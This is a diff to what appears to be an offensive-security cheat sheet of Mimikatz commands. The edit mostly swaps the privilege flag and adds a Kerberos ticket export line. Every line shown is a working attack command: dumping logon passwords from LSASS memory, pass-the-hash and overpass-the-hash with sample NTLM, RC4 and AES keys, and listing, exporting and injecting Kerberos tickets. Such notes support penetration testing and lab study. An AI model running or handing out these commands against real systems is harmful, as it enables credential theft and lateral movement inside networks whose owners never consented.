@@ -76,7 +76,7 @@ token::elevate
 ########################################  
   
 # Dump credentials from LSASS  
-.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"  
+.\mimikatz.exe "token::elevate" "sekurlsa::logonpasswords" "exit"  
   
 # List kerberos tickets in memory  
 .\mimikatz.exe "sekurlsa::tickets" "exit"  
@@ -110,27 +110,28 @@ token::elevate
 .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<UserName> /ntlm:<NTLM_HASH> /domain:<DomainFQDN>" "exit"  
 
 # Example  
-.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /ntlm:8846f7eaee8fb117ad06bdd830b7586c /domain:corp.local" "exit"
+.\mimikatz.exe "token::elevate" "sekurlsa::pth /user:administrator /ntlm:8846f7eaee8fb117ad06bdd830b7586c /domain:corp.local" "exit"
 
 
 # Use NTLM hash to request a Kerberos TGT (Overpass-the-Hash)
-.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<UserName> /domain:<DomainFQDN> /rc4:<NTLM_HASH>" "exit"
+.\mimikatz.exe "token::elevate" "sekurlsa::pth /user:<UserName> /domain:<DomainFQDN> /rc4:<NTLM_HASH>" "exit"
   
 # Example  
-.\mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94 /run:cmd.exe" "exit"
+.\mimikatz.exe "token::elevate" "sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94 /run:cmd.exe" "exit"
 
 # Use AES key instead of NTLM
-.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<UserName> /domain:<DomainFQDN> /aes256:<AES_KEY>" "exit"
+.\mimikatz.exe "token::elevate" "sekurlsa::pth /user:<UserName> /domain:<DomainFQDN> /aes256:<AES_KEY>" "exit"
 
 # Example  
-.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:corp.local /aes256:4f8b42c27bfa8e6a1c3d95d7f2f8c7c23f9f9c0d7e92b3b3bfb39d9b2e8d3c4a /run:powershell.exe" "exit"
+.\mimikatz.exe "token::elevate" "sekurlsa::pth /user:administrator /domain:corp.local /aes256:4f8b42c27bfa8e6a1c3d95d7f2f8c7c23f9f9c0d7e92b3b3bfb39d9b2e8d3c4a /run:powershell.exe" "exit"
   
 ########################################  
 # Pass-the-Ticket (Kerberos ticket reuse)
 ########################################  
   
 # List kerberos tickets currently loadedand dump them  
-.\mimikatz.exe "kerberos::list /dump" "exit"  
+.\mimikatz.exe "token::elevate"  "kerberos::list /dump" "exit"  
+.\mimikatz.exe "token::elevate" "kerberos::list /export" "exit"
   
 # Inject a kerberos ticket into the currenct session
 .\mimikatz.exe "kerberos::ptt <TGT_ticket.kirbi>" "exit"
